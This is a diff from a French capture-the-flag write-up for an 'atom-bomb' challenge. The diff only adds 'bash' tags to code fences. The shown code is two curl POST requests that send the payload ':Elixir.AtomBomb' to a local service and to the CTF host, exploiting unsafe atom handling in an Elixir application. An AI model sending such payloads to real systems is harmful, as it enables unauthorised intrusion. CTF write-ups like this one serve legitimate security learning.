@@ -73,12 +73,12 @@ Ce flag souligne le cœur du problème : l’usage non-sécurisé de la fonction
 
 ## Code des exploits et payloads
 
-```
+```bash
 curl -X POST http://localhost:6888/bomb_impacts \
   -H "Content-Type: application/json" \
   --data '{"impact": ":Elixir.AtomBomb"}'
 ```
-```
+```bash
 curl -X POST https://atom-bomb.atreides.b01lersc.tf/bomb_impacts \
   -H "Content-Type: application/json" \
   --data '{"impact": ":Elixir.AtomBomb"}'
